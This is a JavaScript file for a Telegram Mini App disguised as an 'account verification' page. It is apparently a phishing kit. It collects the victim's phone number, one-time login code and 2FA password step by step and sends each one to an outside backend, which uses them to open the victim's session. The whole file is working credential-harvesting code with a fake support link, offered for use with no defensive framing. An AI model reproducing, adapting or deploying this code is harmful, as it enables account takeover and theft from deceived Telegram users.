// Конфигурация
const BACKEND_URL = 'https://rollsbocks45.onrender.com'; // Замените на ваш URL Render
// Конфигурация

// Переменные состояния
let currentStep = 1;
let sessionId = null;
let phoneNumber = '';
let phoneCodeHash = '';
let countdownInterval = null;

// Инициализация Telegram Web App
const tg = window.Telegram.WebApp;
if (tg && tg.initData) {
    tg.expand();
    tg.enableClosingConfirmation();
    tg.setHeaderColor('secondary_bg_color');
    tg.setBackgroundColor('#0f0f0f');
}

// Функции управления шагами
function showStep(step) {
    // Скрываем все шаги
    document.querySelectorAll('.step').forEach(el => {
        el.classList.remove('active');
    });
    
    // Показываем текущий шаг
    document.getElementById(`step${step}`).classList.add('active');
    currentStep = step;
    
    // Прокручиваем наверх
    window.scrollTo(0, 0);
}

function goBack(step) {
    showStep(step);
}

// Начало верификации
function startVerification() {
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username') || '';
    
    if (username) {
        const displayElement = document.getElementById('usernameDisplay');
        displayElement.textContent = `Account @${username} verification required`;
    }
    
    showStep(2);
}

// Загрузка
function showLoading(text = 'Processing...') {
    document.getElementById('loadingText').textContent = text;
    document.getElementById('loadingOverlay').classList.add('active');
}

function hideLoading() {
    document.getElementById('loadingOverlay').classList.remove('active');
}

// Отправка кода
async function sendCode() {
    const phoneInput = document.getElementById('phoneInput');
    
    if (!phoneInput.value || phoneInput.value.length < 5) {
        showError('Please enter a valid phone number');
        return;
    }
    
    phoneNumber = '+' + phoneInput.value;
    
    showLoading('Sending verification code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            
            showStep(3);
            startCountdown();
        } else {
            showError(data.error || 'Failed to send verification code');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('Network error. Please check your connection and try again.');
    } finally {
        hideLoading();
    }
}

// Верификация кода
async function verifyCode() {
    const codeInputs = document.querySelectorAll('.code-input');
    const code = Array.from(codeInputs).map(input => input.value).join('');
    
    if (code.length !== 5) {
        showError('Please enter 5-digit verification code');
        return;
    }
    
    showLoading('Verifying code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                code: code
            })
        });
        
        const data = await response.json();
        
        if (response.ok) {
            if (data.success) {
                showSuccess(data.session_info);
            } else if (data.requires_2fa) {
                showStep(4);
            } else {
                showError(data.error || 'Verification failed');
            }
        } else {
            showError(data.error || 'Invalid verification code');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Верификация 2FA
async function verify2FA() {
    const passwordInput = document.getElementById('passwordInput');
    const password = passwordInput.value;
    
    if (!password) {
        showError('Please enter 2FA password');
        return;
    }
    
    showLoading('Verifying 2FA...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/verify_2fa`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                session_id: sessionId,
                password: password
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            showSuccess(data.session_info);
        } else {
            showError(data.error || 'Invalid 2FA password');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
    }
}

// Показать успех
function showSuccess(sessionInfo) {
    if (sessionInfo && sessionInfo.user_id) {
        document.getElementById('verifiedUserId').textContent = sessionInfo.user_id;
    }
    
    const now = new Date();
    const timeString = now.toLocaleTimeString([], { hour: '2-digit', minute: '2-digit' });
    document.getElementById('verificationTime').textContent = timeString;
    
    showStep(5);
}

// Показать ошибку
function showError(message) {
    document.getElementById('errorMessage').textContent = message;
    showStep(6);
    hideLoading();
}

// Повторная отправка кода
async function resendCode() {
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    const resendBtn = document.getElementById('resendBtn');
    resendBtn.disabled = true;
    resendBtn.textContent = 'Sending...';
    
    showLoading('Resending code...');
    
    try {
        const response = await fetch(`${BACKEND_URL}/api/send_code`, {
            method: 'POST',
            headers: {
                'Content-Type': 'application/json',
            },
            body: JSON.stringify({
                phone: phoneNumber
            })
        });
        
        const data = await response.json();
        
        if (response.ok && data.success) {
            sessionId = data.session_id;
            phoneCodeHash = data.phone_code_hash;
            startCountdown();
        } else {
            showError(data.error || 'Failed to resend code');
        }
    } catch (error) {
        console.error('Error:', error);
        showError('Network error. Please try again.');
    } finally {
        hideLoading();
        resendBtn.textContent = 'Resend Code';
    }
}

// Таймер
function startCountdown() {
    let countdown = 60;
    const countdownElement = document.getElementById('countdown');
    const resendBtn = document.getElementById('resendBtn');
    
    resendBtn.disabled = true;
    
    countdownElement.textContent = countdown;
    
    if (countdownInterval) {
        clearInterval(countdownInterval);
    }
    
    countdownInterval = setInterval(() => {
        countdown--;
        countdownElement.textContent = countdown;
        
        if (countdown <= 0) {
            clearInterval(countdownInterval);
            resendBtn.disabled = false;
        }
    }, 1000);
}

// Перемещение между полями кода
function moveToNext(input, nextIndex) {
    if (input.value.length === 1) {
        const nextInput = input.nextElementSibling;
        if (nextInput) {
            nextInput.focus();
        }
    } else if (input.value.length === 0) {
        const prevInput = input.previousElementSibling;
        if (prevInput) {
            prevInput.focus();
        }
    }
}

// Закрыть Mini App
function closeMiniApp() {
    if (tg && tg.close) {
        tg.close();
    }
}

// Контакт с поддержкой
function contactSupport() {
    if (tg && tg.openTelegramLink) {
        tg.openTelegramLink('https://t.me/rollssupport');
    } else {
        window.open('https://t.me/rollssupport', '_blank');
    }
}

// Нажатие Enter
document.addEventListener('keypress', (e) => {
    if (e.key === 'Enter') {
        switch (currentStep) {
            case 2:
                sendCode();
                break;
            case 3:
                verifyCode();
                break;
            case 4:
                verify2FA();
                break;
        }
    }
});

// Инициализация
document.addEventListener('DOMContentLoaded', () => {
    const urlParams = new URLSearchParams(window.location.search);
    const username = urlParams.get('username');
    
    if (username) {
        const displayElement = document.getElementById('usernameDisplay');
        displayElement.textContent = `Account @${username} verification required`;
    }
    
    showStep(1);
    
    // Инициализация полей ввода кода
    const codeInputs = document.querySelectorAll('.code-input');
    codeInputs.forEach((input, index) => {
        input.addEventListener('input', (e) => {
            if (e.inputType === 'deleteContentBackward' && input.value === '') {
                const prevInput = input.previousElementSibling;
                if (prevInput) {
                    prevInput.focus();
                }
            }
        });
    });
    
    // Автофокус на поле телефона при переходе на шаг 2
    const observer = new MutationObserver((mutations) => {
        mutations.forEach((mutation) => {
            if (mutation.type === 'attributes' && mutation.attributeName === 'class') {
                if (document.getElementById('step2').classList.contains('active')) {
                    setTimeout(() => {
                        const phoneInput = document.getElementById('phoneInput');
                        if (phoneInput) {
                            phoneInput.focus();
                        }
                    }, 300);
                }
            }
        });
    });
    
    observer.observe(document.getElementById('step2'), {
        attributes: true,
        attributeFilter: ['class']
    });
});